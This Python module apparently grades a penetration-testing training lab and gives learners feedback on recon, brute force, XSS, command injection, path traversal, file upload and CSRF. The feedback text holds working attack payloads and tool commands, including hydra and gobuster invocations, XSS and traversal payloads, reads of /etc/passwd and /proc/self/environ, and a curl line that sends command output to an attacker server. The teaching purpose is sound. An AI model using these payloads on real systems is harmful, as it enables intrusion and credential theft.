"""
backend/lab_analysis.py — Post-mission analysis for Lab mode.

Given the set of evidence event_types observed during a Lab mission, produces:
  - what_worked   : things the learner did correctly, with short praise
  - what_missed   : key actions they didn't take, with an explanation of why they matter
  - better_approach : concrete technique improvements they could apply next time
  - rating        : "excellent" | "good" | "basic"
  - rating_reason : one sentence explaining the rating
"""
from __future__ import annotations

from typing import Any, Dict, List, Set

# ── Per-module analysis specs ──────────────────────────────────────────────
#
# Each entry defines:
#   key_events   : dict of event_type → praise text (shown in "what worked")
#   miss_events  : dict of event_type → explanation (shown in "what missed")
#   better       : list of technique tips always shown after completion
#   excellent_required : set of event_types needed for an "excellent" rating
#   good_required      : set of event_types needed for a "good" rating
#   (anything below good_required = "basic")

ANALYSIS_SPECS: Dict[str, Dict[str, Any]] = {
    "recon": {
        "key_events": {
            "portal_visited": "You confirmed the target was live and read the landing page.",
            "search_used": "You tested the search endpoint — a common injection entry point.",
            "diagnostics_used": "You probed the diagnostics page, which runs shell commands server-side.",
            "file_viewer_used": "You accessed the file viewer — a classic path-traversal target.",
            "file_upload_used": "You found the upload endpoint — often leads to unrestricted upload or stored XSS.",
            "hidden_clue_accessed": "You discovered a non-obvious metadata file that isn't linked from the UI.",
            "recon_sequence_observed": "You triggered the full recon-sequence detection by systematically visiting all major areas.",
            "route_discovered": "You enumerated routes beyond the obvious UI links.",
        },
        "miss_events": {
            "hidden_clue_accessed": (
                "You never accessed a hidden metadata file (e.g., /robots.txt, /.well-known/security.txt, "
                "/.git/config). These files are a standard first check in any recon phase — they often "
                "disclose internal paths, contacts, or source control details."
            ),
            "recon_sequence_observed": (
                "You didn't visit enough distinct application areas to trigger the recon-sequence detection. "
                "Systematic surface mapping — hitting every endpoint, not just the ones that look interesting — "
                "is what separates a thorough pentest from a spot-check."
            ),
            "diagnostics_used": (
                "You skipped the Network Diagnostics page. Any feature that runs a system command "
                "(ping, traceroute, nslookup) is a high-priority target for command injection."
            ),
            "file_viewer_used": (
                "You didn't explore the Document Viewer. File-reading features are the most common "
                "path traversal targets and should always be on your recon list."
            ),
        },
        "better": [
            "Use gobuster or ffuf to brute-force hidden paths beyond what the UI links to: "
            "`gobuster dir -u http://target-agent -w /usr/share/wordlists/dirb/common.txt -t 20`",
            "Read response headers with `curl -I http://target-agent/` — the Server header often "
            "leaks the framework version and lets you look up known CVEs.",
            "View page source for HTML comments; developers frequently leave build metadata, "
            "internal hostnames, and debug notes in templates.",
            "Always check /robots.txt, /.git/config, /.env, and /sitemap.xml early — "
            "they are quick wins that often expose the entire internal route map.",
        ],
        "excellent_required": {"portal_visited", "hidden_clue_accessed", "recon_sequence_observed", "diagnostics_used"},
        "good_required":      {"portal_visited", "recon_sequence_observed"},
    },

    "brute_force": {
        "key_events": {
            "login_failed": "You submitted failed login attempts, generating detectable failure events.",
            "brute_force_pattern": "You triggered the brute-force pattern detection — 3+ failures in a short window.",
            "credential_found": "You discovered a valid credential pair through repeated attempts.",
            "login_success": "You confirmed the credential by achieving a successful authenticated login.",
        },
        "miss_events": {
            "brute_force_pattern": (
                "You never generated enough login failures to trigger the brute-force pattern alert. "
                "Testing whether a rate-limit or lockout policy exists requires deliberately sending "
                "multiple failures and observing whether the server slows down or blocks you."
            ),
            "credential_found": (
                "You didn't find a valid credential. Without confirming a working username/password pair "
                "the attack is incomplete — the key finding in brute-force testing is proving the endpoint "
                "is exploitable end-to-end, not just that it lacks rate limiting."
            ),
            "login_success": (
                "You triggered credential detection but never confirmed it with an actual successful login. "
                "Always verify the credential manually to prove it grants real access."
            ),
        },
        "better": [
            "Enumerate usernames before brute-forcing passwords. The easy backend leaks "
            "whether a username exists via different error messages — test 'admin' vs a random "
            "string and compare responses. Once you know valid usernames, your password list "
            "only needs to run against those accounts.",
            "Use hydra for automated credential testing: "
            "`hydra -l admin -P /wordlists/passwords-small.txt target-agent "
            "http-post-form '/auth/login:username=^USER^&password=^PASS^:Incorrect'`",
            "In real engagements, credential stuffing (using known breached password lists) "
            "is far more effective than dictionary attacks. Tools like Dehashed or breach datasets "
            "dramatically shrink the search space.",
            "Always test for account lockout, CAPTCHA, and request throttling. If none exist, "
            "document it — that is its own critical finding independent of whether you crack a password.",
        ],
        "excellent_required": {"brute_force_pattern", "credential_found", "login_success"},
        "good_required":      {"brute_force_pattern", "credential_found"},
    },

    "xss": {
        "key_events": {
            "search_used": "You used the search endpoint — the correct entry point for reflected XSS here.",
            "xss_payload_observed": "You submitted XSS-shaped payloads that the detection recognised.",
            "reflected_input_detected": "You confirmed the server reflects your input verbatim — proof of exploitability.",
        },
        "miss_events": {
            "xss_payload_observed": (
                "You used the search endpoint but never sent a recognisable XSS payload "
                "(<script>, onerror=, onload=, javascript:). Testing reflection without "
                "a payload only proves the parameter echoes input — it doesn't prove exploitation."
            ),
            "reflected_input_detected": (
                "Your payloads weren't confirmed as reflected. Check the raw response body "
                "(use curl or ZAP) rather than relying on browser rendering, which may "
                "sanitise or block alerts in its own security layer."
            ),
        },
        "better": [
            "Test multiple XSS contexts — not just <script> tags. The same vulnerability may "
            "need different payloads depending on where in the HTML your input lands: "
            "inside a tag attribute, inside a JavaScript string, or inside a URL.",
            "Use event-handler payloads to bypass naive script-tag filters: "
            "`<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`, `<body onpageshow=alert(1)>`",
            "Always check whether a Content Security Policy (CSP) header is present: "
            "`curl -I http://target-agent/search` — if no CSP header exists, inline script "
            "execution is unrestricted, which makes the finding significantly more severe.",
            "In a real engagement, XSS is most dangerous when it can steal session cookies. "
            "Check whether the session cookie has HttpOnly set: if not, `document.cookie` "
            "can be exfiltrated to an attacker-controlled server.",
        ],
        "excellent_required": {"xss_payload_observed", "reflected_input_detected"},
        "good_required":      {"xss_payload_observed"},
    },

    "cmd_injection": {
        "key_events": {
            "diagnostics_used": "You accessed the diagnostics endpoint and observed normal ping output.",
            "command_separator_observed": "You tested shell metacharacters — the right approach for injection testing.",
            "command_injection_detected": "You achieved confirmed command injection with real command output in the response.",
        },
        "miss_events": {
            "command_separator_observed": (
                "You used the diagnostics page but never sent any shell metacharacters. "
                "Command injection testing requires deliberately injecting separator characters "
                "(;, |, &&, $(), backticks) to see if the server interprets them. "
                "Normal use of a feature never reveals an injection vulnerability."
            ),
            "command_injection_detected": (
                "You submitted metacharacters but didn't get confirmed command output. "
                "Try reading a predictable file whose content proves execution: "
                "`127.0.0.1; cat /etc/passwd` — if you see 'root:x:0:0', injection is confirmed. "
                "Also try $() substitution: `127.0.0.1$(id)` — some filters block ; and | but miss $()"
            ),
        },
        "better": [
            "Test every separator type systematically before concluding an endpoint is safe: "
            "`;id`, `|id`, `&&id`, `` `id` ``, `$(id)`, `%0aid`. Different backends strip "
            "different characters — what fails with ; may succeed with $().",
            "Once you confirm execution, escalate to file disclosure to prove real impact: "
            "`; cat /etc/passwd`, `; cat /proc/self/environ`, `; env`. "
            "These outputs are concrete evidence for a report.",
            "In real engagements, blind injection (where output doesn't reflect in the response) "
            "is more common. Use out-of-band techniques: `; curl http://your-server/?$(whoami)` "
            "to exfiltrate data via DNS or HTTP to a server you control.",
            "The safe fix is subprocess with shell=False and an argument list. "
            "Knowing this helps you recommend a precise remediation, not just 'sanitise input'.",
        ],
        "excellent_required": {"command_separator_observed", "command_injection_detected"},
        "good_required":      {"command_separator_observed"},
    },

    "dir_traversal": {
        "key_events": {
            "file_viewer_used": "You accessed the file viewer with a normal request to establish a baseline.",
            "traversal_pattern_observed": "You submitted path traversal sequences — the correct technique.",
            "sensitive_file_disclosed": "You successfully read a sensitive system file, confirming full traversal.",
        },
        "miss_events": {
            "traversal_pattern_observed": (
                "You used the file viewer but never attempted any path traversal. "
                "The vulnerability only becomes apparent when you try ../ sequences or "
                "absolute paths like /etc/passwd. Reading the intended file proves the feature "
                "works; reading /etc/passwd proves it's vulnerable."
            ),
            "sensitive_file_disclosed": (
                "You submitted traversal patterns but didn't reach a sensitive file. "
                "Adjust the depth of ../ sequences — from the app's base directory you "
                "may need 4-6 levels up to reach /etc/passwd. Also try absolute paths "
                "directly: `path=/etc/passwd` bypasses ../ filters entirely."
            ),
        },
        "better": [
            "Always try both relative traversal (`../../etc/passwd`) and absolute paths (`/etc/passwd`). "
            "Many filters block ../ sequences but forget to restrict absolute path input.",
            "Test URL-encoded variants to bypass string-matching filters: "
            "`..%2f..%2fetc%2fpasswd`, `%2e%2e%2f%2e%2e%2fetc%2fpasswd`, "
            "and double-encoded `%252e%252e%252f`.",
            "After /etc/passwd, escalate: try `/proc/self/environ` (leaks environment variables "
            "including secrets), `/proc/self/cmdline` (app startup command), and "
            "app-specific config files like `/app/config.py` or `/.env`.",
            "In real engagements, path traversal often leads directly to credential disclosure "
            "when config files or .env files are reachable. Always check for database "
            "connection strings and API keys.",
        ],
        "excellent_required": {"traversal_pattern_observed", "sensitive_file_disclosed"},
        "good_required":      {"traversal_pattern_observed"},
    },

    "file_upload": {
        "key_events": {
            "file_upload_used": "You interacted with the upload endpoint.",
            "file_saved": "You confirmed a file was accepted and stored by the server.",
            "dangerous_extension_accepted": "The server accepted a file with a dangerous extension — the core finding.",
            "unrestricted_upload_detected": "You confirmed unrestricted upload: dangerous content stored without validation.",
        },
        "miss_events": {
            "file_saved": (
                "You reached the upload page but no file was saved. Make sure you're sending "
                "a proper multipart/form-data request with the file field named 'file': "
                "`curl -F 'file=@test.txt' http://target-agent/files/upload`"
            ),
            "dangerous_extension_accepted": (
                "You uploaded files but never tried a dangerous extension. "
                "The vulnerability is specifically that the server applies no extension policy. "
                "Upload a .php, .html, .svg, or .js file to trigger the detection."
            ),
            "unrestricted_upload_detected": (
                "You uploaded a dangerous-extension file but the full unrestricted-upload "
                "detection didn't fire. Verify the file is stored and publicly accessible "
                "at /static/uploads/ — that confirms it's both accepted and served."
            ),
        },
        "better": [
            "Test multiple bypass techniques beyond simple extensions: "
            "double extensions (shell.php.txt), null byte injection (shell.php%00.txt), "
            "and alternative PHP extensions (.phtml, .php5, .phar) that many block lists miss.",
            "Upload an HTML file containing `<script>alert(document.domain)</script>` "
            "and browse to the served URL. If the browser executes it, you've chained "
            "file upload into stored XSS — a more impactful combined finding.",
            "Try content-type spoofing: upload a PHP script but set Content-Type to image/jpeg. "
            "If the server trusts the MIME type over the actual content or extension, "
            "you've found an additional bypass.",
            "In real engagements, the most critical scenario is uploading to a path "
            "served by a runtime interpreter. Always check the upload destination: "
            "files in /static/ are usually harmless; files in /cgi-bin/ or /app/ are not.",
        ],
        "excellent_required": {"dangerous_extension_accepted", "unrestricted_upload_detected"},
        "good_required":      {"file_saved", "dangerous_extension_accepted"},
    },

    "csrf": {
        "key_events": {
            "csrf_lure_visited": "You visited the attacker lure page — the correct starting point for a CSRF demo.",
            "csrf_token_missing": "You triggered the missing-token detection on a POST to the update endpoint.",
            "profile_changed_without_csrf": "You achieved a state change without a CSRF token — full proof of exploitability.",
            "profile_update_used": "You interacted with the profile update endpoint.",
        },
        "miss_events": {
            "csrf_lure_visited": (
                "You never visited the attacker lure page (/evil/csrf-demo). "
                "CSRF testing requires simulating a cross-origin form submission. "
                "The lure page contains a hidden form that auto-submits to the "
                "vulnerable endpoint, proving the attack requires no user interaction beyond a click."
            ),
            "csrf_token_missing": (
                "You interacted with the profile update endpoint but the missing-token "
                "detection didn't fire. Inspect the form HTML — look for a hidden field "
                "named _csrf_token or similar. If none exists, that is the vulnerability."
            ),
            "profile_changed_without_csrf": (
                "You demonstrated missing tokens but didn't complete the state change. "
                "Use the lure page to submit a forged POST, then re-visit /profile/ "
                "to confirm the email was mutated — that is the proof-of-impact step."
            ),
        },
        "better": [
            "After proving CSRF, test the depth of the defence: does the server check "
            "the Referer header? The Origin header? Try forging each with curl: "
            "`curl -X POST -H 'Origin: https://evil.com' http://target-agent/profile/update`",
            "Check the session cookie's SameSite attribute in the browser DevTools > "
            "Application > Cookies. SameSite=Strict or Lax would block the cross-site "
            "POST in modern browsers — absent or SameSite=None is a finding.",
            "In real engagements, CSRF is most impactful on state-changing endpoints "
            "like password change, email change, money transfer, or admin actions. "
            "Always prioritise those endpoints over read-only ones.",
            "Modern Single Page Apps (SPAs) that use Authorization: Bearer tokens "
            "are naturally CSRF-resistant because browsers don't auto-attach custom headers. "
            "Cookie-based sessions remain vulnerable unless SameSite is enforced.",
        ],
        "excellent_required": {"csrf_lure_visited", "csrf_token_missing", "profile_changed_without_csrf"},
        "good_required":      {"csrf_token_missing", "profile_changed_without_csrf"},
    },
}


def analyse(module_id: str, evidence_events: List[Dict[str, Any]]) -> Dict[str, Any]:
    """Produce a post-mission analysis report from a list of evidence dicts.

    Each evidence dict must have at least an `event_type` key.
    Returns a dict with: what_worked, what_missed, better_approach, rating, rating_reason.
    """
    spec = ANALYSIS_SPECS.get(module_id)
    if spec is None:
        return _unknown_module(module_id)

    observed: Set[str] = {e.get("event_type", "") for e in evidence_events if e.get("event_type")}

    # What worked
    what_worked = []
    for et, praise in spec["key_events"].items():
        if et in observed:
            what_worked.append({"event": et, "text": praise})

    # What was missed
    what_missed = []
    for et, explanation in spec["miss_events"].items():
        if et not in observed:
            what_missed.append({"event": et, "text": explanation})

    # Better approach — always included
    better_approach = spec["better"]

    # Rating
    excellent_set: Set[str] = spec.get("excellent_required", set())
    good_set: Set[str] = spec.get("good_required", set())

    if excellent_set and excellent_set.issubset(observed):
        rating = "excellent"
        rating_reason = (
            "You hit every key detection milestone for this module and demonstrated "
            "a thorough, methodical approach."
        )
    elif good_set and good_set.issubset(observed):
        rating = "good"
        rating_reason = (
            "You completed the core objective. Review the missed steps above to "
            "reach a more comprehensive exploitation chain next time."
        )
    elif what_worked:
        rating = "basic"
        rating_reason = (
            "You made progress but left significant parts of the attack chain unexplored. "
            "Work through the missed steps and try again."
        )
    else:
        rating = "incomplete"
        rating_reason = (
            "No key evidence was recorded from your session. "
            "Make sure you are using AttackBox or ZAP tools — browser clicks alone "
            "do not count as evidence in Lab mode."
        )

    return {
        "module_id":       module_id,
        "rating":          rating,
        "rating_reason":   rating_reason,
        "what_worked":     what_worked,
        "what_missed":     what_missed,
        "better_approach": better_approach,
        "evidence_count":  len(evidence_events),
        "observed_events": sorted(observed),
    }


def _unknown_module(module_id: str) -> Dict[str, Any]:
    return {
        "module_id":       module_id,
        "rating":          "unknown",
        "rating_reason":   f"No analysis spec available for module '{module_id}'.",
        "what_worked":     [],
        "what_missed":     [],
        "better_approach": [],
        "evidence_count":  0,
        "observed_events": [],
    }
